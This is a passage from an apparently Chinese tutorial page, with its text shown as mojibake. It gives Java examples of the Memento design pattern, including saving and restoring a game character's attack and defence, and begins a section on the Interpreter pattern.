é›†åˆä¸­ä¼šæœ‰å¾ˆå¤šçš„å¤‡å¿˜å½•å¯¹è±¡</span><br>   <span class="hljs-keyword">private</span> List&lt;Memento&gt; mementoList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Memento&gt;();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(Memento memento)</span> &#123;<br>      mementoList.add(memento);<br>   &#125;<br>   <br>   <span class="hljs-comment">//è·å–åˆ°ç¬¬indexä¸ªOriginator çš„ å¤‡å¿˜å½•å¯¹è±¡(å³ä¿å­˜çŠ¶æ€)</span><br>   <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> &#123;<br>      <span class="hljs-keyword">return</span> mementoList.get(index);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>      <span class="hljs-type">Originator</span> <span class="hljs-variable">originator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Originator</span>();<br>      <span class="hljs-type">Caretaker</span> <span class="hljs-variable">caretaker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Caretaker</span>();<br>      <br>      originator.setState(<span class="hljs-string">&quot; çŠ¶æ€#1 æ”»å‡»åŠ› 100 &quot;</span>);<br>      <br>      <span class="hljs-comment">//ä¿å­˜äº†å½“å‰çš„çŠ¶æ€</span><br>      caretaker.add(originator.saveStateMemento());<br>      <br>      originator.setState(<span class="hljs-string">&quot; çŠ¶æ€#2 æ”»å‡»åŠ› 80 &quot;</span>);<br>      <br>      caretaker.add(originator.saveStateMemento());<br>      <br>      originator.setState(<span class="hljs-string">&quot; çŠ¶æ€#3 æ”»å‡»åŠ› 50 &quot;</span>);<br>      caretaker.add(originator.saveStateMemento());<br>      <br>      <br>      <br>      System.out.println(<span class="hljs-string">&quot;å½“å‰çš„çŠ¶æ€æ˜¯ =&quot;</span> + originator.getState());<br>      <br>      <span class="hljs-comment">//å¸Œæœ›å¾—åˆ°çŠ¶æ€ 1, å°† originator æ¢å¤åˆ°çŠ¶æ€1</span><br>      <br>      originator.getStateFromMemento(caretaker.get(<span class="hljs-number">0</span>));<br>      System.out.println(<span class="hljs-string">&quot;æ¢å¤åˆ°çŠ¶æ€1 , å½“å‰çš„çŠ¶æ€æ˜¯&quot;</span>);<br>      System.out.println(<span class="hljs-string">&quot;å½“å‰çš„çŠ¶æ€æ˜¯ =&quot;</span> + originator.getState());<br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Memento.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Memento</span> &#123;<br>   <span class="hljs-keyword">private</span> String state;<br><br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Memento</span><span class="hljs-params">(String state)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.state = state;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> state;<br>   &#125;<br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Originator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Originator</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String state;<span class="hljs-comment">//çŠ¶æ€ä¿¡æ¯</span><br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> state;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(String state)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = state;<br>    &#125;<br><br>    <span class="hljs-comment">//ç¼–å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ä¿å­˜ä¸€ä¸ªçŠ¶æ€å¯¹è±¡ Memento</span><br>    <span class="hljs-comment">//å› æ­¤ç¼–å†™ä¸€ä¸ªæ–¹æ³•ï¼Œè¿”å› Memento</span><br>    <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">saveStateMemento</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memento</span>(state);<br>    &#125;<br><br>    <span class="hljs-comment">//é€šè¿‡å¤‡å¿˜å½•å¯¹è±¡ï¼Œæ¢å¤çŠ¶æ€</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getStateFromMemento</span><span class="hljs-params">(Memento memento)</span> &#123;<br>        state = memento.getState();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">å½“å‰çš„çŠ¶æ€æ˜¯ = çŠ¶æ€<span class="hljs-meta">#3 æ”»å‡»åŠ› 50 </span><br>æ¢å¤åˆ°çŠ¶æ€<span class="hljs-number">1</span> , å½“å‰çš„çŠ¶æ€æ˜¯<br>å½“å‰çš„çŠ¶æ€æ˜¯ = çŠ¶æ€<span class="hljs-meta">#1 æ”»å‡»åŠ› 100 </span><br></code></pre></td></tr></table></figure><h3 id="æ¸¸æˆè§’è‰²æ¢å¤çŠ¶æ€"><a class="markdownIt-Anchor" href="#æ¸¸æˆè§’è‰²æ¢å¤çŠ¶æ€"></a> æ¸¸æˆè§’è‰²æ¢å¤çŠ¶æ€</h3><p>æ¸¸æˆè§’è‰²æœ‰æ”»å‡»åŠ›å’Œé˜²å¾¡åŠ›ï¼Œåœ¨å¤§æˆ˜ Boss å‰ä¿å­˜è‡ªèº«çš„çŠ¶æ€(æ”»å‡»åŠ›å’Œé˜²å¾¡åŠ›)ï¼Œå½“å¤§æˆ˜ Boss åæ”»å‡»åŠ›å’Œé˜²å¾¡åŠ›ä¸‹é™ï¼Œä»å¤‡å¿˜å½•å¯¹è±¡æ¢å¤åˆ°å¤§æˆ˜å‰çš„çŠ¶æ€</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104163634868.png" alt="image-20230104163634868" /></p><p><code>Caretaker.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-comment">//å®ˆæŠ¤è€…å¯¹è±¡, ä¿å­˜æ¸¸æˆè§’è‰²çš„çŠ¶æ€</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Caretaker</span> &#123;<br><br>   <span class="hljs-comment">//å¦‚æœåªä¿å­˜ä¸€æ¬¡çŠ¶æ€</span><br>   <span class="hljs-keyword">private</span> Memento  memento;<br>   <span class="hljs-comment">//å¯¹GameRole ä¿å­˜å¤šæ¬¡çŠ¶æ€</span><br>   <span class="hljs-comment">//private ArrayList&lt;Memento&gt; mementos;</span><br>   <span class="hljs-comment">//å¯¹å¤šä¸ªæ¸¸æˆè§’è‰²ä¿å­˜å¤šä¸ªçŠ¶æ€</span><br>   <span class="hljs-comment">//private HashMap&lt;String, ArrayList&lt;Memento&gt;&gt; rolesMementos;</span><br><br>   <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">getMemento</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> memento;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMemento</span><span class="hljs-params">(Memento memento)</span> &#123;<br>      <span class="hljs-built_in">this</span>.memento = memento;<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ›å»ºæ¸¸æˆè§’è‰²</span><br>      <span class="hljs-type">GameRole</span> <span class="hljs-variable">gameRole</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GameRole</span>();<br>      gameRole.setVit(<span class="hljs-number">100</span>);<br>      gameRole.setDef(<span class="hljs-number">100</span>);<br>      <br>      System.out.println(<span class="hljs-string">&quot;å’Œbosså¤§æˆ˜å‰çš„çŠ¶æ€&quot;</span>);<br>      gameRole.display();<br>      <br>      <span class="hljs-comment">//æŠŠå½“å‰çŠ¶æ€ä¿å­˜caretaker</span><br>      <span class="hljs-type">Caretaker</span> <span class="hljs-variable">caretaker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Caretaker</span>();<br>      caretaker.setMemento(gameRole.createMemento());<br>      <br>      System.out.println(<span class="hljs-string">&quot;å’Œbosså¤§æˆ˜~~~&quot;</span>);<br>      gameRole.setDef(<span class="hljs-number">30</span>);<br>      gameRole.setVit(<span class="hljs-number">30</span>);<br>      <br>      gameRole.display();<br>      <br>      System.out.println(<span class="hljs-string">&quot;å¤§æˆ˜åï¼Œä½¿ç”¨å¤‡å¿˜å½•å¯¹è±¡æ¢å¤åˆ°ç«™å‰&quot;</span>);<br>      <br>      gameRole.recoverGameRoleFromMemento(caretaker.getMemento());<br>      System.out.println(<span class="hljs-string">&quot;æ¢å¤åçš„çŠ¶æ€&quot;</span>);<br>      gameRole.display();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>GameRole.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GameRole</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> vit;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> def;<br>   <br>   <span class="hljs-comment">//åˆ›å»ºMemento ,å³æ ¹æ®å½“å‰çš„çŠ¶æ€å¾—åˆ°Memento</span><br>   <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">createMemento</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memento</span>(vit, def);<br>   &#125;<br>   <br>   <span class="hljs-comment">//ä»å¤‡å¿˜å½•å¯¹è±¡ï¼Œæ¢å¤GameRoleçš„çŠ¶æ€</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recoverGameRoleFromMemento</span><span class="hljs-params">(Memento memento)</span> &#123;<br>      <span class="hljs-built_in">this</span>.vit = memento.getVit();<br>      <span class="hljs-built_in">this</span>.def = memento.getDef();<br>   &#125;<br>   <br>   <span class="hljs-comment">//æ˜¾ç¤ºå½“å‰æ¸¸æˆè§’è‰²çš„çŠ¶æ€</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;æ¸¸æˆè§’è‰²å½“å‰çš„æ”»å‡»åŠ›ï¼š&quot;</span> + <span class="hljs-built_in">this</span>.vit + <span class="hljs-string">&quot; é˜²å¾¡åŠ›: &quot;</span> + <span class="hljs-built_in">this</span>.def);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVit</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> vit;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVit</span><span class="hljs-params">(<span class="hljs-type">int</span> vit)</span> &#123;<br>      <span class="hljs-built_in">this</span>.vit = vit;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> def;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(<span class="hljs-type">int</span> def)</span> &#123;<br>      <span class="hljs-built_in">this</span>.def = def;<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Memento.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Memento</span> &#123;<br><br>   <span class="hljs-comment">//æ”»å‡»åŠ›</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> vit;<br>   <span class="hljs-comment">//é˜²å¾¡åŠ›</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> def;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Memento</span><span class="hljs-params">(<span class="hljs-type">int</span> vit, <span class="hljs-type">int</span> def)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.vit = vit;<br>      <span class="hljs-built_in">this</span>.def = def;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVit</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> vit;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVit</span><span class="hljs-params">(<span class="hljs-type">int</span> vit)</span> &#123;<br>      <span class="hljs-built_in">this</span>.vit = vit;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> def;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(<span class="hljs-type">int</span> def)</span> &#123;<br>      <span class="hljs-built_in">this</span>.def = def;<br>   &#125;<br>   <br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">å’Œbosså¤§æˆ˜å‰çš„çŠ¶æ€</span><br><span class="hljs-attribute">æ¸¸æˆè§’è‰²å½“å‰çš„æ”»å‡»åŠ›ï¼š100 é˜²å¾¡åŠ›</span><span class="hljs-punctuation">:</span> <span class="hljs-string">100</span><br><span class="hljs-attribute">å’Œbosså¤§æˆ˜~~~</span><br><span class="hljs-attribute">æ¸¸æˆè§’è‰²å½“å‰çš„æ”»å‡»åŠ›ï¼š30 é˜²å¾¡åŠ›</span><span class="hljs-punctuation">:</span> <span class="hljs-string">30</span><br><span class="hljs-attribute">å¤§æˆ˜åï¼Œä½¿ç”¨å¤‡å¿˜å½•å¯¹è±¡æ¢å¤åˆ°ç«™å‰</span><br><span class="hljs-attribute">æ¢å¤åçš„çŠ¶æ€</span><br><span class="hljs-attribute">æ¸¸æˆè§’è‰²å½“å‰çš„æ”»å‡»åŠ›ï¼š100 é˜²å¾¡åŠ›</span><span class="hljs-punctuation">:</span> <span class="hljs-string">100</span><br></code></pre></td></tr></table></figure><h2 id="å¤‡å¿˜å½•æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#å¤‡å¿˜å½•æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> å¤‡å¿˜å½•æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>ç»™ç”¨æˆ·æä¾›äº†ä¸€ç§å¯ä»¥æ¢å¤çŠ¶æ€çš„æœºåˆ¶ï¼Œå¯ä»¥ä½¿ç”¨æˆ·èƒ½å¤Ÿæ¯”è¾ƒæ–¹ä¾¿åœ°å›åˆ°æŸä¸ªå†å²çš„çŠ¶æ€</p></li><li><p>å®ç°äº†ä¿¡æ¯çš„å°è£…ï¼Œä½¿å¾—ç”¨æˆ·ä¸éœ€è¦å…³å¿ƒçŠ¶æ€çš„ä¿å­˜ç»†èŠ‚</p></li><li><p>å¦‚æœç±»çš„æˆå‘˜å˜é‡è¿‡å¤šï¼ŒåŠ¿å¿…ä¼šå ç”¨æ¯”è¾ƒå¤§çš„èµ„æºï¼Œè€Œä¸”æ¯ä¸€æ¬¡ä¿å­˜éƒ½ä¼šæ¶ˆè€—ä¸€å®šçš„å†…å­˜, è¿™ä¸ªéœ€è¦æ³¨æ„</p></li><li><p>é€‚ç”¨çš„åº”ç”¨åœºæ™¯ï¼š</p><ul><li>1ã€åæ‚”è¯ã€‚</li><li>2ã€æ‰“æ¸¸æˆæ—¶çš„å­˜æ¡£ã€‚</li><li>3ã€Windows é‡Œçš„ ctri + zã€‚</li><li>4ã€IE ä¸­çš„åé€€ã€‚</li><li>5ã€æ•°æ®åº“çš„äº‹åŠ¡ç®¡ç†</li></ul></li></ol><h1 id="è§£é‡Šå™¨æ¨¡å¼"><a class="markdownIt-Anchor" href="#è§£é‡Šå™¨æ¨¡å¼"></a> è§£é‡Šå™¨æ¨¡å¼</h1><p>è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰æä¾›äº†è¯„ä¼°è¯­è¨€çš„è¯­æ³•æˆ–è¡¨è¾¾å¼çš„æ–¹å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼å®ç°äº†ä¸€ä¸ªè¡¨è¾¾å¼æ¥å£ï¼Œè¯¥æ¥å£è§£é‡Šä¸€ä¸ªç‰¹å®šçš„ä¸Šä¸‹æ–‡ã€‚è¿™ç§æ¨¡å¼è¢«ç”¨åœ¨ SQL<br />è§£æã€ç¬¦å·å¤„ç†å¼•æ“ç­‰ã€‚</p><h2 id="ä»‹ç»-19"><a class="markdownIt-Anchor" href="#ä»‹ç»-19"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> ç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„æ–‡æ³•è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥æ ‡è¯†æ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> å¯¹äºä¸€äº›å›ºå®šæ–‡æ³•æ„å»ºä¸€ä¸ªè§£é‡Šå¥å­çš„è§£é‡Šå™¨ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong><br />å¦‚æœä¸€ç§ç‰¹å®šç±»å‹çš„é—®é¢˜å‘ç”Ÿçš„é¢‘ç‡è¶³å¤Ÿé«˜ï¼Œé‚£ä¹ˆå¯èƒ½å°±å€¼å¾—å°†è¯¥é—®é¢˜çš„å„ä¸ªå®ä¾‹è¡¨è¿°ä¸ºä¸€ä¸ªç®€å•è¯­è¨€ä¸­çš„å¥å­ã€‚è¿™æ ·å°±å¯ä»¥æ„å»ºä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¯¥è§£é‡Šå™¨é€šè¿‡è§£é‡Šè¿™äº›å¥å­æ¥è§£å†³è¯¥é—®é¢˜ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> æ„å»ºè¯­æ³•æ ‘ï¼Œå®šä¹‰ç»ˆç»“ç¬¦ä¸éç»ˆç»“ç¬¦ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> æ„å»ºç¯å¢ƒç±»ï¼ŒåŒ…å«è§£é‡Šå™¨ä¹‹å¤–çš„ä¸€äº›å…¨å±€ä¿¡æ¯ï¼Œä¸€èˆ¬æ˜¯ HashMapã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> ç¼–è¯‘å™¨ã€è¿ç®—è¡¨è¾¾å¼è®¡ç®—ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€å¯æ‰©å±•æ€§æ¯”è¾ƒå¥½ï¼Œçµæ´»ã€‚ 2ã€å¢åŠ äº†æ–°çš„è§£é‡Šè¡¨è¾¾å¼çš„æ–¹å¼ã€‚ 3ã€æ˜“äºå®ç°ç®€å•æ–‡æ³•ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€å¯åˆ©ç”¨åœºæ™¯æ¯”è¾ƒå°‘ã€‚ 2ã€å¯¹äºå¤æ‚çš„æ–‡æ³•æ¯”è¾ƒéš¾ç»´æŠ¤ã€‚ 3ã€è§£é‡Šå™¨æ¨¡å¼ä¼šå¼•èµ·ç±»è†¨èƒ€ã€‚ 4ã€è§£é‡Šå™¨æ¨¡å¼é‡‡ç”¨é€’å½’è°ƒç”¨æ–¹æ³•ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€å¯ä»¥å°†ä¸€ä¸ªéœ€è¦è§£é‡Šæ‰§è¡Œçš„è¯­è¨€ä¸­çš„å¥å­è¡¨ç¤ºä¸ºä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ã€‚ 2ã€ä¸€äº›é‡å¤å‡ºç°çš„é—®é¢˜å¯ä»¥ç”¨ä¸€ç§ç®€å•çš„è¯­è¨€æ¥è¿›è¡Œè¡¨è¾¾ã€‚<br />3ã€ä¸€ä¸ªç®€å•è¯­æ³•éœ€è¦è§£é‡Šçš„åœºæ™¯ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> å¯åˆ©ç”¨åœºæ™¯æ¯”è¾ƒå°‘ï¼ŒJAVA ä¸­å¦‚æœç¢°åˆ°å¯ä»¥ç”¨ expression4J ä»£æ›¿ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104170305404.png" alt="image-20230104170305404" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(è§£é‡Šå™¨æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>Context: æ˜¯ç¯å¢ƒè§’è‰²,å«æœ‰è§£é‡Šå™¨ä¹‹å¤–çš„å…¨å±€ä¿¡æ¯.</p></li><li><p>AbstractExpression: æŠ½è±¡è¡¨è¾¾å¼ï¼Œ å£°æ˜ä¸€ä¸ªæŠ½è±¡çš„è§£é‡Šæ“ä½œ,è¿™ä¸ªæ–¹æ³•ä¸ºæŠ½è±¡è¯­æ³•æ ‘ä¸­æ‰€æœ‰çš„èŠ‚ç‚¹æ‰€å…±äº«</p></li><li><p>TerminalExpression: ä¸ºç»ˆç»“ç¬¦è¡¨è¾¾å¼, å®ç°ä¸æ–‡æ³•ä¸­çš„ç»ˆç»“ç¬¦ç›¸å…³çš„è§£é‡Šæ“ä½œ</p></li><li><p>NonTermialExpression: ä¸ºéç»ˆç»“ç¬¦è¡¨è¾¾å¼ï¼Œä¸ºæ–‡æ³•ä¸­çš„éç»ˆç»“ç¬¦å®ç°è§£é‡Šæ“ä½œ.</p></li><li><p>è¯´æ˜ï¼š è¾“å…¥ Context he TerminalExpression ä¿¡æ¯é€šè¿‡ 